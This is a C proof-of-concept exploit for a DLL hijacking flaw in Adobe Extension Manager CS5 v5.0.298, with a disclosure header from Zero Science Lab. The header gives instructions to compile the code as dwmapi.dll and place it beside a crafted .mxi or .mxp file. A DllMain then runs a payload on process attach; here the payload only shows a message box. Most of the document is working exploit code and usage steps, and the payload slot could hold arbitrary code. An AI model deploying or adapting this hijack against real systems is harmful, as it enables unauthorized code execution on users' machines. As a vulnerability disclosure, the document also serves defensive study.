/*

 Adobe Extension Manager CS5 v5.0.298 (dwmapi.dll) DLL Hijacking Exploit

 Vendor: Adobe Systems Inc.
 Product Web Page: http://www.adobe.com
 Affected Version: CS5 v5.0.298

 Summary: Easily install new extensions and manage the ones you already
 have with the Adobe Extension Manager.

 Desc: Adobe Extension Manager CS5 suffers from a dll hijacking vulnerability
 that enables the attacker to execute arbitrary code on a local level. The
 vulnerable extensions are .mxi and .mxp thru dwmapi.dll library.

 ----
 gcc -shared -o dwmapi.dll adobeem.c

 Compile and rename to dwmapi.dll, create a file test.mxi or test.mxp and
 put both files in same dir and execute.
 ----

 Tested on Microsoft Windows XP Professional SP3 (EN)



 Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
 liquidworm gmail com

 Zero Science Lab - http://www.zeroscience.mk


 25.08.2010

*/


#include <windows.h>

BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{

	switch (fdwReason)
	{
		case DLL_PROCESS_ATTACH:
		dll_mll();
		case DLL_THREAD_ATTACH:
		case DLL_THREAD_DETACH:
		case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

int dll_mll()
{
	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
}